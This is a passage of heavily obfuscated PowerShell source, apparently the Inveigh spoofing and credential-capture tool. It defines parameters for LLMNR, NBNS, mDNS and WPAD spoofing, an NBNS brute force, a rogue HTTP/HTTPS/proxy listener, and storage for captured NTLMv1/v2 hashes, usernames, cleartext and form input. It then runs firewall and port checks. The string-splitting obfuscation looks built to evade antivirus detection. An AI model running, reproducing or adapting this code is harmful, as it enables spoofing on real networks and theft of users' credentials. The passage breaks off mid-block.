 SeT-itEm ("v"+"ariA"+"blE:l"+"4P")  ([TyPe]("{2}{0}{1}"-f'aShTAb','LE','h'))  ;  ${9`lP`20} = [tYPe]("{7}{2}{4}{1}{3}{6}{5}{0}" -F 'ITY','curity','.S','.PRin','E','DeNT','CiPal.windOWsI','sYSteM');   sEt-iTeM  VariAbLe:KtFO0W ( [tyPE]("{5}{1}{2}{3}{7}{6}{0}{4}" -f 'Sl','YsTeM.sEcURitY','.A','Uth','ProtOCoLs','s','n.S','ENTIcaTiO')) ;  SeT  jMe ([type]("{3}{1}{2}{0}" -F'LE','.i','o.Fi','SYSTEm')  )  ;   SET-VAriAbLe 13Qwo  (  [TyPe]("{5}{4}{3}{2}{6}{0}{1}" -F 'dREsSfA','mily','ocKetS.a','t.S','e','n','d')) ;sEt-ITeM  ('V'+'Ar'+'iaBl'+'E:qD7') ([tyPE]("{2}{3}{0}{1}{4}"-F '.So','cKetTyP','N','eT.sOcKetS','e') )  ;    ${C`lIW} =[tYPE]("{6}{5}{4}{0}{2}{1}{3}" -F'C','Ts.pro','Ke','ToCoLtYpE','T.so','E','n') ; ${e`Qs} = [tYPE]("{3}{5}{1}{2}{4}{0}"-F 'ODe','s.ioCo','NT','sy','rOLc','sTEM.net.SoCKEt') ;   SET-iteM  VaRIaBLe:waq ( [typE]("{0}{6}{4}{1}{2}{5}{3}" -F 'S','OckEt','s.soCKEt','lAgs','S','f','yStem.NeT.') ) ;  Sv  Hf9  ( [tYPe]("{7}{4}{0}{3}{2}{1}{5}{6}" -F 'Em.N','.','cKETS','Et.sO','YSt','A','DdREsSFAMiLY','s') );    sV  ("7"+"2eUQX") (  [Type]("{7}{6}{0}{5}{3}{4}{2}{1}" -F'Tem','oCKEttYpE','OCkETS.S','NET','.s','.','ys','S') )  ;    ${z`T`Dwx}= [tYPE]("{1}{3}{0}{5}{4}{2}" -f'SockEtS.P','SystE','ltyPE','M.Net.','otoco','r') ;  ${9`s`zNJT}=[TYPe]("{4}{1}{0}{3}{2}" -F't.','ex','ng','eNCODI','T');   ${wx`9L}  = [TYPE]("{2}{0}{1}" -f 'PAD','DreSs','I');  SEt-ItEM ("VAri"+"A"+"B"+"lE:vwe")  ([TYPe]("{3}{1}{4}{2}{0}" -F 'ERT','ys','.coNV','S','tem')) ; ${l`N5H}=  [TypE]("{0}{4}{1}{2}{3}" -F'SY','tEm.tEX','t.encodI','Ng','s') ;${5e`9A}  =  [TyPE]("{1}{0}{5}{2}{4}{3}"-f 'm','sySte','o','Ter','NVeR','.BITc') ;sET-iTem  VaRIABlE:ygAT1e  ([Type]("{0}{1}"-F'ArRa','y') );  SEt-Item varIable:170n  ( [TYpe]("{0}{3}{2}{1}" -F 'SYSTem','AddRESS','et.ip','.n') );   sEt  ('792'+'fiB') (  [TyPe]("{2}{1}{3}{0}"-f'tOry','CEf','RunSpa','Ac')  )  ;   SEt-ItEm  ('Va'+'RIa'+'Ble:H6'+'l'+'5')  ([Type]("{2}{0}{1}"-f 'WERshEL','l','po'));  seT-VariAble Cw5 (  [TyPE]("{2}{3}{4}{0}{1}" -F'ostics.S','tOpwatch','SYSTE','M.','DIAgn'));   ${O`k3Df}=[TypE]("{0}{2}{1}" -F 'CO','ole','NS') ; function i`NvOk`E-iNvEigH
{



[CmdletBinding()]
param
( 
    [parameter(mAndAtORy=${fA`Lse})][Array]${H`TTprESE`TdE`LAy} = ("{2}{1}{0}"-f 'fox','re','Fi'),
    [parameter(ManDaToRy=${FA`LSe})][Array]${pRO`xYig`NO`Re} = ("{0}{2}{1}"-f 'F','x','irefo'),
    [parameter(MaNDAtoRy=${f`ALsE})][Array]${sPoOf`eRHOs`Ts`RePLY} = "",
    [parameter(MaNdaTOrY=${fA`L`se})][Array]${SP`o`oFerHoStSiGN`O`Re} = "",
    [parameter(MandatorY=${F`AlSe})][Array]${Sp`oof`ER`IpsREPLY} = "",
    [parameter(mandAToRy=${fa`L`sE})][Array]${sP`OoF`erI`pSIGnore} = "",
    [parameter(MaNdAtOrY=${FA`lsE})][Array]${W`padDIr`E`C`THOStS} = "",
    [parameter(mANdAtOry=${FA`LSe})][Array]${wp`AD`A`UtHiGNOre} = ("{1}{0}" -f 'ox','Firef'),
    [parameter(MAnDaTORY=${Fa`l`sE})][Int]${Co`N`so`LEQuEueLi`MiT} = "-1",
    [parameter(MANDatoRY=${f`AlSE})][Int]${c`onSOLe`St`A`TUs} = "",
    [parameter(mAnDaToRy=${f`AL`sE})][Int]${h`TtPp`orT} = "80",
    [parameter(manDAtoRy=${F`A`LSE})][Int]${HTT`p`sPORt} = "443",
    [parameter(maNDatorY=${fa`LSe})][Int]${HTT`PRES`eTdELaY`TImEO`UT} = "30",
    [parameter(MaNdaToRy=${Fa`l`SE})][Int]${Ll`MnRTtL} = "30",
    [parameter(MAnDaTOry=${fa`L`Se})][Int]${MD`N`sttL} = "120",
    [parameter(maNDatORy=${f`ALSe})][Int]${N`Bn`sttL} = "165",
    [parameter(MandAToRy=${f`AlSE})][Int]${nb`N`sB`RUteforCE`pA`Use} = "",
    [parameter(mAnDATOry=${FA`L`se})][Int]${Pr`OX`ypOrt} = ("{1}{0}" -f'492','8'),
    [parameter(MANDaTORY=${F`AL`sE})][Int]${RUn`coUnt} = "",
    [parameter(maNDAtorY=${Fa`l`Se})][Int]${RUnT`IMe} = "",
    [parameter(MAnDaToRY=${FA`LSe})][Int]${wpAD`p`OrT} = "",
    [parameter(mANdaTOrY=${Fal`Se})][Int]${SpOoFE`RleArnI`NGdel`Ay} = "",
    [parameter(mANDaTorY=${f`ALse})][Int]${SpO`oF`eRLEARNINGI`NTerv`Al} = "30",
    [parameter(mANdAtorY=${F`AL`sE})][String]${hTT`PBASI`cR`EaLm} = "IIS",
    [parameter(maNdatory=${Fa`L`SE})][String]${HTTp`cON`T`e`NtT`ypE} = ("{0}{1}{2}"-f 'text/','ht','ml'),
    [parameter(mAndaTOry=${Fa`lse})][String]${hTt`pDefa`U`LTF`ile} = "",
    [parameter(MANDaToRY=${FAL`se})][String]${HTt`P`defA`Ulte`xe} = "",
    [parameter(mAnDatOry=${fAL`Se})][String]${h`T`TprEsPON`Se} = "",
    [parameter(MaNdATOrY=${fa`LSe})][String]${HtTPsCE`Rt`ISsueR} = ("{1}{0}"-f'eigh','Inv'),
    [parameter(MandAtory=${Fa`lSE})][String]${h`Ttp`S`CeRtsub`JeCt} = ("{1}{3}{0}{2}"-f'lho','l','st','oca'),
    [parameter(mANdAtory=${fa`LSE})][String]${Nbns`Brut`EFoR`CE`ho`St} = ("{0}{1}" -f 'WP','AD'),
    [parameter(MAnDaTorY=${F`AL`sE})][String]${wPad`R`e`SPOnSE} = "",
    [parameter(mANdatorY=${FA`lSE})][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]${cha`llEn`gE} = "",
    [parameter(maNdaTorY=${Fa`lsE})][ValidateSet("Y","N")][String]${cOnSO`l`EUniQUE} = "Y",
    [parameter(maNdAtoRy=${Fal`se})][ValidateSet("Y","N")][String]${Fil`eou`TPuT} = "N",
    [parameter(maNdAToRY=${f`AlSE})][ValidateSet("Y","N")][String]${fiL`E`UNIqUE} = "Y",
    [parameter(maNDatorY=${Fa`L`SE})][ValidateSet("Y","N")][String]${HT`TP} = "Y",
    [parameter(ManDAToRy=${F`ALsE})][ValidateSet("Y","N")][String]${H`TTpS} = "N",
    [parameter(MAnDAtoRy=${F`ALsE})][ValidateSet("Y","N")][String]${hTTPs`F`oRC`ecE`RtDELete} = "N",
    [parameter(MANDatORy=${FA`LSE})][ValidateSet("Y","N")][String]${llM`NR} = "Y",
    [parameter(maNdAtORy=${Fal`se})][ValidateSet("Y","N")][String]${loG`oU`TP`Ut} = "Y",
    [parameter(MaNDAtory=${f`AL`sE})][ValidateSet("Y","N")][String]${Machi`Nea`CCOun`Ts} = "N",
    [parameter(mandatOry=${fal`Se})][ValidateSet("Y","N")][String]${mD`NS} = "N",
    [parameter(MaNDaTOrY=${fa`L`sE})][ValidateSet("Y","N")][String]${N`Bns} = "N",
    [parameter(manDatorY=${F`AlsE})][ValidateSet("Y","N")][String]${nBnS`Br`U`TEforCe} = "N",
    [parameter(MAnDATOrY=${f`AlSE})][ValidateSet("Y","N")][String]${oUTPu`T`S`Tream`o`Nly} = "N",
    [parameter(mAnDatorY=${Fa`LSE})][ValidateSet("Y","N")][String]${pR`oXy} = "N",
    [parameter(maNdatoRY=${fAL`SE})][ValidateSet("Y","N")][String]${S`hOW`heLP} = "Y",
    [parameter(mANDaTOrY=${F`A`lSE})][ValidateSet("Y","N")][String]${S`mb} = "Y",
    [parameter(MandATOrY=${f`A`lse})][ValidateSet("Y","N")][String]${sp`OoFER`lEA`RNIng} = "N",
    [parameter(manDATory=${FaL`SE})][ValidateSet("Y","N")][String]${sp`oOFe`R`Re`PEAT} = "Y",
    [parameter(MaNDatOry=${F`ALsE})][ValidateSet("Y","N")][String]${sta`TusO`UTP`UT} = "Y",
    [parameter(MandaTorY=${fa`L`sE})][ValidateSet("Y","N")][String]${wpAD`DIrECT`F`ILe} = "Y",
    [parameter(mAndAToRy=${FA`L`SE})][ValidateSet("Y","N")][String]${stA`RtUP`C`HE`cks} = "Y",
    [parameter(MaNdATorY=${f`ALSe})][ValidateSet("Y","N","Low",{"{0}{1}{2}" -f 'M','e','dium'})][String]${c`ON`so`leouTpUt} = "N",
    [parameter(manDAtoRy=${fa`lSE})][ValidateSet({"{1}{0}" -f 'o','Aut'},"Y","N")][String]${ElEVa`Tedp`RIVil`eGE} = ("{1}{0}" -f'to','Au'),
    [parameter(MaNdaTORy=${FA`l`sE})][ValidateSet({"{2}{0}{1}"-f'onymou','s','An'},{"{1}{0}" -f 'ic','Bas'},{"{1}{0}" -f'LM','NT'},{"{1}{0}"-f 'MNoESS','NTL'})][String]${htTPAu`TH} = ("{1}{0}" -f'M','NTL'),
    [parameter(MANDatoRy=${Fa`LSE})][ValidateSet("QU","QM")][Array]${m`d`NSt`YPEs} = @("QU"),
    [parameter(maNDatOrY=${FAl`se})][ValidateSet("00","03","20","1B","1C","1D","1E")][Array]${N`BN`sTYpes} = @("00","20"),
    [parameter(manDAtORY=${fa`LSe})][ValidateSet({"{0}{1}" -f'B','asic'},{"{1}{0}" -f'TLM','N'},{"{1}{2}{0}"-f 'oESS','NTLM','N'})][String]${pro`X`yauTH} = ("{1}{0}" -f 'LM','NT'),
    [parameter(mANDatORY=${FA`lse})][ValidateSet("0","1","2")][String]${t`OOl} = "0",
    [parameter(maNdaToRy=${F`A`LSE})][ValidateSet({"{2}{0}{1}" -f 'm','ous','Anony'},{"{1}{0}"-f'c','Basi'},{"{1}{0}" -f'TLM','N'},{"{0}{1}{2}"-f'NTLMNo','ES','S'})][String]${W`padA`UTh} = ("{1}{0}"-f 'LM','NT'),
    [parameter(mandatORY=${fA`LSe})][ValidateScript({&("{0}{1}{2}"-f'Te','s','t-Path') ${_}})][String]${FILEOUT`puTdiR`E`CtORY} = "",
    [parameter(MAndAtOrY=${fa`lSe})][ValidateScript({&("{2}{0}{1}" -f 'st-Pa','th','Te') ${_}})][String]${HT`TP`dIr} = "",
    [parameter(mANdAtOrY=${faL`sE})][Switch]${in`s`PEcT},
    [parameter(MandATory=${FA`lsE})][ValidateScript({${_} -match [System.Net.IPAddress]${_}})][String]${H`Tt`PIP} = ("{1}{0}{2}"-f '.0.0','0','.0'),
    [parameter(ManDAToRY=${FaL`Se})][ValidateScript({${_} -match [System.Net.IPAddress]${_}})][String]${i`p} = "",
    [parameter(MAndATORy=${fAL`Se})][ValidateScript({${_} -match [System.Net.IPAddress]${_}})][String]${nbn`sbRu`TEfoR`c`eTarGET} = "",
    [parameter(mAndAtoRy=${Fa`lSe})][ValidateScript({${_} -match [System.Net.IPAddress]${_}})][String]${P`R`oXyip} = ("{1}{0}{2}"-f'0','0.','.0.0'),
    [parameter(MaNDatOrY=${f`A`Lse})][ValidateScript({${_} -match [System.Net.IPAddress]${_}})][String]${sPo`O`Fe`RIP} = "",
    [parameter(ManDATory=${FAl`sE})][ValidateScript({${_} -match [System.Net.IPAddress]${_}})][String]${w`pAd`IP} = "",
    [parameter(vAlUefrOMREMAInINgARgUMeNTs=${tr`Ue})]${iNV`ALId_PAR`Am`eTeR}
)

if (${InVAliD_`pARA`ME`T`eR})
{
    &("{0}{2}{1}" -f 'Wri','t','te-Outpu') "Error:$($invalid_parameter) is not a valid parameter "
    throw
}

${INve`IGh_`Ver`Sion} = ("{1}{0}"-f'.3.1','1')

if(!${Ip})
{ 
    ${IP} = (&("{4}{3}{0}{2}{1}" -f'on','on','necti','C','Test-') ("{1}{2}{0}" -f '.0.1','127.','0') -count 1 | &("{1}{0}{2}{3}" -f't','Selec','-Obje','ct') -ExpandProperty ("{1}{0}{2}{3}"-f'4Addr','Ipv','e','ss'))
}

if(!${s`P`Oo`FERiP})
{
    ${S`P`OO`FeRIP} = ${IP}  
}

if(${HTt`pDE`FA`UltFile} -or ${hT`TpD`eFAULT`eXE})
{

    if(!${Ht`TpdIr})
    {
        &("{1}{2}{0}"-f'put','Wri','te-Out') ("{10}{11}{4}{18}{3}{14}{2}{1}{16}{19}{9}{7}{6}{8}{5}{12}{17}{20}{0}{15}{13}"-f 'Fi','HTTPD','y an -','ust spe',' ','T',' -','sing either','H','u','Error:Yo','u','TPDe','E','cif','le or -HTTPDefaultEX','ir w','fa','m','hen ','ult')
        throw
    }

}

if(${w`P`ADip} -or ${WpadP`o`RT})
{

    if(!${wPa`DiP})
    {
        &("{1}{0}{2}"-f'e','Writ','-Output') ("{9}{2}{1}{3}{5}{7}{6}{10}{0}{8}{4}" -f'ort to ',' mus','r:You','t spec','th -WPADIP','ify a ','PAD','-W','go wi','Erro','P')
        throw
    }

    if(!${wPa`d`POrT})
    {
        &("{3}{1}{0}{2}"-f 'u','e-Outp','t','Writ') ("{2}{4}{1}{7}{11}{10}{8}{9}{6}{3}{5}{0}"-f 'ort','t ','Error:Yo','A','u mus','DP','IP to go with -WP','spec','PA','D','y a -W','if')
        throw
    }

}

if(${NBn`s`BRuT`EFo`RCe} -eq 'Y' -and !${nB`Ns`BrUtefO`Rc`eta`RGet})
{
    &("{1}{2}{0}"-f 'ut','Writ','e-Outp') ("{10}{18}{19}{20}{12}{21}{7}{14}{15}{6}{13}{5}{11}{3}{0}{4}{9}{2}{17}{8}{16}{1}" -f'if en','uteForce','lin','t ','a','g','or','ru',' ','b','Error:Yo','e','t s','ceTar','t','eF','-NBNSBr','g','u',' ','mus','pecify a -NBNSB')
    throw
}

if(!${fiLe`oUt`PUTD`IREcTORy})
{ 
    ${O`UtP`U`T`_dirECTory} = ${p`Wd}."PA`Th"
}
else
{
    ${o`UT`pU`T_`DireCTory} = ${FIleo`Ut`PUtdi`R`E`Ct`Ory}
}

if(!${iN`VEI`Gh})
{
    ${GL`oBaL:inv`e`Igh} =   (get-VaRIAblE  ('L'+'4p') )."Val`Ue"::("{0}{2}{3}{1}"-f'S','d','ynch','ronize').Invoke(@{})
    ${in`VeIGh}."Cle`ArTeX`T`_lI`sT" = &("{2}{0}{1}" -f 'ew-','Object','N') ("{4}{1}{3}{0}{2}" -f'lections.Ar','tem.','rayList','Col','Sys')
    ${In`VEi`Gh}."IP_caPtuR`e`_LI`st" = &("{0}{2}{1}"-f'New','ct','-Obje') ("{7}{6}{1}{0}{5}{2}{4}{3}" -f'l','tem.Col','ions.ArrayLi','t','s','ect','ys','S')
    ${I`NV`eIGh}."L`OG" = &("{1}{0}{2}"-f'O','New-','bject') ("{3}{4}{2}{0}{7}{1}{5}{8}{6}" -f'lect','s.','stem.Col','S','y','Array','t','ion','Lis')
    ${I`NvEigH}."nTl`MV1`_lI`sT" = &("{2}{1}{0}"-f'bject','w-O','Ne') ("{5}{2}{6}{3}{1}{0}{4}" -f 'a','Arr','y','s.','yList','S','stem.Collection')
    ${INv`E`Igh}."ntLMV`1_use`R`NamE_lIST" = &("{2}{1}{0}" -f 'ject','w-Ob','Ne') ("{7}{6}{1}{2}{5}{3}{0}{4}" -f 'is','o','lle','rayL','t','ctions.Ar','m.C','Syste')
    ${in`V`EIGh}."NT`lmV`2_LISt" = &("{1}{2}{0}" -f 't','N','ew-Objec') ("{2}{0}{6}{5}{3}{1}{7}{4}{8}"-f't','ns.Arr','Sys','tio','Lis','m.Collec','e','ay','t')
    ${I`NvEIgh}."N`TLMV2`_USerNa`mE_`L`IsT" = &("{0}{2}{1}"-f'New','bject','-O') ("{1}{3}{2}{4}{5}{0}"-f 'ist','System.Coll','tions.Ar','ec','ray','L')
    ${inv`EiGh}."pO`st`_rEqU`Est_LIsT" = &("{0}{2}{3}{1}" -f'New','bject','-','O') ("{4}{1}{0}{8}{2}{7}{5}{3}{6}"-f 'l','em.Col','ions.','yLi','Syst','rra','st','A','ect')
    ${I`NVEI`gH}."sM`BREla`Y_FaiLEd_`l`I`sT" = &("{0}{3}{1}{2}" -f 'New-O','je','ct','b') ("{0}{4}{3}{6}{7}{1}{2}{5}"-f'Sys','rrayL','i','.Coll','tem','st','ect','ions.A')
    ${IN`VeigH}."Va`LID_H`oST_LiSt" = &("{2}{0}{1}"-f'w-Obje','ct','Ne') ("{7}{0}{5}{6}{4}{3}{1}{2}" -f 'ystem.','.ArrayLis','t','ns','io','Colle','ct','S')
}

if(${I`NV`EiGh}."RuNnI`NG")
{
    &("{1}{2}{0}"-f 'e-Output','Wr','it') ("{12}{8}{7}{3}{1}{11}{2}{6}{9}{4}{10}{0}{5}{13}"-f'Stop-In','e','gh is ','nv','dy run','vei','alre','-I','r:Invoke','a','ning, use ','i','Erro','gh')
    throw
}

if(${htTp_`L`is`TEN`eR}."is`Li`sTeninG" -and !${INv`e`igh}."Re`LAy_RuN`Ni`NG")
{
    ${htTP_li`S`TEN`ER}.("{0}{1}" -f 'St','op').Invoke()
    ${hTtP`_l`I`stE`NEr}.("{0}{1}" -f'C','lose').Invoke()
}

if(!${I`NV`eiGH}."relAY_ruN`Ni`NG")
{
    ${I`NVEIGH}."cl`eARTEXt_FI`l`E_quEUE" = &("{1}{0}{2}"-f'-Objec','New','t') ("{1}{8}{0}{3}{4}{5}{2}{6}{7}" -f'm.','S','a','C','ollections.','Arr','y','List','yste')
    ${iNV`E`iGh}."Cons`O`L`E_q`UeUe" = &("{1}{2}{0}{3}"-f 'c','N','ew-Obje','t') ("{4}{0}{3}{1}{2}"-f 'c','ions.ArrayLis','t','t','System.Colle')
    ${iN`VEIGh}."ht`Tp`_cHaLleNgE_`qU`eUe" = &("{2}{0}{1}" -f'w-Obj','ect','Ne') ("{1}{3}{5}{4}{7}{8}{0}{6}{2}"-f 'A','System.C','t','o','l','l','rrayLis','ection','s.')
    ${iN`VEi`Gh}."lOg_f`ile_qUE`Ue" = &("{1}{2}{0}"-f't','New-','Objec') ("{1}{3}{2}{4}{0}" -f'List','Syst','ollect','em.C','ions.Array')
    ${I`N`VeIgh}."N`TlMv1_fILE_QU`e`UE" = &("{1}{0}{2}"-f'ew-Obj','N','ect') ("{0}{2}{1}{3}{4}" -f'System.Colle','o','cti','ns.ArrayL','ist')
    ${inv`E`igh}."NTLMv2_`FILe_`Que`UE" = &("{3}{0}{2}{1}"-f 'w-Ob','ct','je','Ne') ("{0}{1}{3}{4}{2}" -f 'System.','Col','ArrayList','lection','s.')
    ${inVe`igH}."PosT`_R`e`qU`E`sT_fIlE_Q`UEuE" = &("{1}{0}{2}" -f 'ew-Obje','N','ct') ("{3}{2}{4}{0}{1}"-f'Lis','t','m.Collect','Syste','ions.Array')
    ${i`NveIGH}."sTAT`Us_qu`euE" = &("{0}{2}{1}" -f'Ne','ct','w-Obje') ("{0}{2}{1}{5}{4}{6}{3}{7}"-f'S','st','y','ArrayLi','m.Collecti','e','ons.','st')
    ${InV`Ei`gH}."cOns`o`le_inpUt" = ${tR`Ue}
    ${i`Nv`eIGH}."c`On`SolE_o`UT`PuT" = ${fal`se}
    ${iNV`E`IGh}."FiL`e`_oU`TPUT" = ${F`A`LSe}
    ${iNVe`Igh}."htTp`S`_`EXiStIng_ce`RTiFi`CATE" = ${F`ALsE}
    ${I`NVEi`GH}."h`Tt`pS`_`FORCe_ceRTIf`iCaT`e_d`El`ETe" = ${F`ALsE}
    ${iN`VE`IGH}."l`OG_`ouTput" = ${TR`Ue}
    ${inV`e`IGh}."CLe`Ar`TE`Xt_ouT_File" = ${o`U`Tput`_di`RecT`ORy} + ((("{0}{3}{4}{1}{2}"-f '{0}In','eart','ext.txt','ve','igh-Cl'))-f[cHAR]92)
    ${InV`eI`gh}."LOg_out`_`Fi`LE" = ${oU`T`pUt_`dIrE`ct`oRy} + ((("{1}{3}{0}{2}" -f 'Inveigh-','T','Log.txt','s3'))."rEPla`Ce"(([ChaR]84+[ChaR]115+[ChaR]51),[STrinG][ChaR]92))
    ${i`NVeI`Gh}."NTlmV1_`O`UT_`FiLE" = ${O`UTpUT_dI`REC`TORy} + ((("{6}{3}{4}{1}{5}{0}{2}" -f'Mv1.','igh-NT','txt','Inv','e','L','{0}')) -F[ChAr]92)
    ${inVe`iGh}."NTl`mV2_`O`U`T_FilE" = ${Ou`Tpu`T_Di`RE`CTORy} + ((("{1}{4}{2}{0}{5}{3}" -f'NTLMv2','tBKI','igh-','xt','nve','.t'))."rEpl`ACe"(([ChAR]116+[ChAR]66+[ChAR]75),[strING][ChAR]92))
    ${i`NvEIgH}."pOS`T_R`eQu`eSt_Ou`T_`FIle" = ${OU`TpUt`_DI`ReCt`O`RY} + ((("{3}{1}{0}{4}{6}{2}{5}"-f 'v','rIn','ormInpu','mu','e','t.txt','igh-F'))."REP`LACE"(([cHAr]109+[cHAr]117+[cHAr]114),'\'))
}

if(${e`lEVateDpRI`VI`LEGE} -eq ("{0}{1}" -f'A','uto'))
{
    ${eL`EVATED_p`Riv`i`L`Ege} = [Bool]((  (gI  ('VAR'+'iab'+'LE:'+'9lp'+'20'))."VAl`UE"::("{1}{0}{2}" -f'ren','GetCur','t').Invoke())."Gro`UpS" -match ("{0}{2}{1}"-f'S-1-5-32-','4','54'))
}
else
{
 
    if(${el`Ev`AteD`P`RIVi`LEge} -eq 'Y')
    {
        ${eLEv`A`T`Ed_p`RiVIle`ge} = ${t`RUe}
    }
    else
    {
        ${Ele`V`A`T`ED_Pr`iVilEGE} = ${F`A`LSE}
    }
    
}

if(${ST`ArTUpche`C`kS} -eq 'Y')
{

    ${f`irewA`LL_St`AT`Us} = &("{0}{1}"-f'ne','tsh') ("{3}{0}{1}{2}" -f 'dvfi','rewa','ll','a') ("{1}{0}" -f 'w','sho') ("{1}{0}{2}{3}" -f 'l','a','lpr','ofiles') ("{0}{1}"-f 'sta','te') | &("{0}{1}{2}" -f 'Whe','re-Objec','t') {${_} -match 'ON'}

    if(${Ht`Tp} -eq 'Y')
    {
        ${htT`p`_PORt`_`Che`CK} = &("{1}{0}" -f'etstat','n') -anp ("{0}{1}" -f'TC','P') | &("{1}{0}" -f 'ndstr','fi') ("{2}{0}{1}" -f 'S','TENING','LI') | &("{0}{1}" -f 'findst','r') ((("{0}{3}{4}{2}{1}"-f'/C:7','4HTTPPort ','P:7L','L4HT','TPI'))  -crepLACe  ([ChaR]55+[ChaR]76+[ChaR]52),[ChaR]36)
    }

    if(${H`TT`ps} -eq 'Y')
    {
        ${hT`Tps`_p`oRt_ChEcK} = &("{0}{2}{1}"-f'netst','t','a') -anp ("{1}{0}"-f 'CP','T') | &("{1}{0}"-f'r','findst') ("{0}{2}{1}"-f'LISTE','NG','NI') | &("{1}{0}{2}" -f'st','find','r') (("{6}{2}{4}{0}{1}{5}{3}" -f':','6','PsHT','PSPort ','TPIP','PsHTT','/C:6')).("{1}{0}"-f 'placE','re').Invoke('6Ps','$')
    }

    if(${Pr`OxY} -eq 'Y')
    {
        ${PR`oxY_PorT_`C`HEcK} = &("{1}{0}" -f't','netsta') -anp ("{0}{1}"-f'T','CP') | &("{0}{1}"-f'fi','ndstr') ("{2}{1}{0}"-f'TENING','IS','L') | &("{1}{0}{2}"-f 'dst','fin','r') ((("{2}{1}{0}{5}{4}{3}"-f'm','oHTTPIP:J','/C:Jm','oxyPort ','r','oP'))  -cReplAcE  ([cHar]74+[cHar]109+[cHar]111),[cHar]36)
    }

    if(${lL`MNr} -eq 'Y' -and !${eLe`VatEd_P`RI`Vi`L`E`ge})
    {
        ${L`lMNR`_P`Or`T_Check} = &("{0}{1}"-f 'nets','tat') -anp ("{1}{0}" -f'DP','U') | &("{1}{0}" -f'dstr','fin') ("{2}{1}{3}{0}"-f' ','.0.0','/C:0','.0:5355')
    }

    if(${m`dns} -eq 'Y' -and !${El`Evate`d_prIVile`Ge})
    {
        ${MdnS_POr`T`_`CHecK} = &("{0}{1}"-f'netst','at') -anp ("{1}{0}" -f'P','UD') | &("{0}{1}"-f'findst','r') ("{1}{0}{2}{3}" -f':0.0.0.0:53','/C','5','3 ')
    }

}

if(!${ElEvATED_`pr`ivi`legE})
{

    if(${hT`T`ps} -eq 'Y')
    {
        &("{1}{0}{2}"-f 'Outpu','Write-','t') ("{0}{10}{6}{11}{3}{1}{8}{4}{2}{7}{9}{5}"-f 'Er','s ','evat',' require','l','ges','r:-HTTP','ed privi','e','le','ro','S')
        throw
    }

    if(${S`P`OO`F`erleAR`NiNg} -eq 'Y')
    {
        &("{3}{0}{2}{1}"-f 'ite-Ou','ut','tp','Wr') ("{3}{13}{2}{1}{8}{4}{5}{9}{12}{7}{0}{6}{10}{11}"-f 're','-Sp','ror:','E','o','ferL','s elevate','qui','o','ea','d privi','leges','rning re','r')
        throw
    }

    ${N`BNs} = "Y"
    ${S`mb} = "N"

}

${iNvE`i`GH}."H`o`sTNAMe_Sp`oOF" = ${fAL`Se}
${in`VEIgh}."r`Unn`inG" = ${T`RUe}

if(${sTaTUSo`UT`p`UT} -eq 'Y')
{
    ${I`NV`eIGH}."stAtUs_`OuTp`UT" = ${t`RuE}
}
else
{
    ${IN`VeI`gH}."s`T`AT`US_oUtput" = ${F`Al`Se}
}

if(${oUTpU`TSTReA`M`on`ly} -eq 'Y')
{
    ${INVe`I`GH}."OuT`pUT_`S`TreA`m_On`Ly" = ${t`RUE}
}
else
{
    ${InV`e`Igh}."OutP`Ut`_`S`Tream_`OnLY" = ${fa`LSe}
}

if(${INSP`E`Ct})
{

    if(${eLEVaTED_`p`RIv`ilegE})
    {
        ${lL`MnR} = "N"
        ${mD`NS} = "N"
        ${nb`NS} = "N"
        ${h`Ttp} = "N"
        ${h`TtPS} = "N"
        ${p`RoxY} = "N"
    }
    else
    {
        ${HT`TP} = "N"
        ${h`TTpS} = "N"
        ${p`Roxy} = "N"
    }

}

if(${T`ooL} -eq 1) 
{
    ${Inv`EIGh}."t`OOL" = 1
    ${I`NVEIGH}."oUTput_`ST`REam_oN`Ly" = ${TR`Ue}
    ${inV`eIgh}."n`ewlInE" = ""
    ${con`SoLeo`U`TpUt} = "N"

}
elseif(${t`oOL} -eq 2) 
{
    ${INveI`Gh}."TO`ol" = 2
    ${i`NVe`IGH}."O`UtPut_`StREam_O`N`Ly" = ${TR`UE}
    ${INv`EIgh}."C`ON`sO`lE_InpUT" = ${fal`sE}
    ${InV`eI`gh}."nEWlI`Ne" = ""
    ${LO`gO`UTPuT} = "N"
    ${s`H`OwhelP} = "N"

    switch (${co`NSO`leOu`Tp`UT})
    {

        'Low'
        {
            ${co`Nsoleo`U`TpuT} = "Low"
        }

        ("{2}{0}{1}"-f'u','m','Medi')
        {
            ${C`oNso`LEOUTpUt} = ("{0}{1}" -f'Medi','um')
        }

        ("{0}{1}"-f 'defaul','t')
        {
            ${CO`NSOLeO`U`TP`UT} = "Y"
        }

    }

}
else
{
    ${iNv`e`igH}."TO`Ol" = 0
    ${iN`V`EiGH}."NEW`l`iNE" = ""
}


${I`Nve`IgH}."StA`TUs`_q`UeUe".("{0}{1}"-f'Ad','d').Invoke(("Inveigh $inveigh_version started at $(Get-Date -format 's') "))  > ${n`UlL}

if(${fILeO`U`TPUT} -eq 'Y')
{
    ${I`N`VeiGh}."lO`G_`File_q`UeuE".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - Inveigh $inveigh_version started ")) > ${nu`lL}
}

if(${loGOu`TP`Ut} -eq 'Y')
{
    ${i`NVEIgH}."L`oG".("{0}{1}"-f'Ad','d').Invoke(("$(Get-Date -format 's') - Inveigh started ")) > ${n`UlL}
    ${iN`VEi`Gh}."LOg_`Out`Put" = ${T`RUE}
}
else
{
    ${I`Nv`EIGh}."lOG_`OU`Tp`UT" = ${fA`L`SE}
}

if(${e`leVAt`e`dPRI`VilEGE} -eq 'Y' -or ${ELeva`TED_pR`ivilE`ge})
{
    ${IN`VEi`GH}."ST`A`TuS_QUEUE".("{1}{0}" -f'dd','A').Invoke(("{4}{6}{0}{5}{3}{2}{1}{9}{7}{8}" -f 'ivilege M','= En','e ','d','Ele','o','vated Pr','e','d','abl'))  > ${n`ULL}
}
else
{
    ${In`VE`Igh}."STaTuS_`Q`UeuE".("{0}{1}" -f'A','dd').Invoke(("{0}{6}{3}{2}{1}{5}{4}" -f'Ele',' = D','e','e Mod','led','isab','vated Privileg'))  > ${N`ULL}
}

if(${Fi`R`ewAll_STa`TUS})
{
    ${inV`Ei`GH}."sT`AtU`s_qUEuE".("{0}{1}" -f'Ad','d').Invoke(("{2}{0}{7}{1}{6}{4}{5}{3}"-f'ndow','ewal','Wi','led','Ena','b','l = ','s Fir'))  > ${NU`LL}
    ${F`IRE`waLl`_rules} = &("{1}{0}{2}" -f 'w-Obje','Ne','ct') -comObject ("{1}{0}{2}{3}"-f 'Fw','HNetCfg.','Pol','icy2')
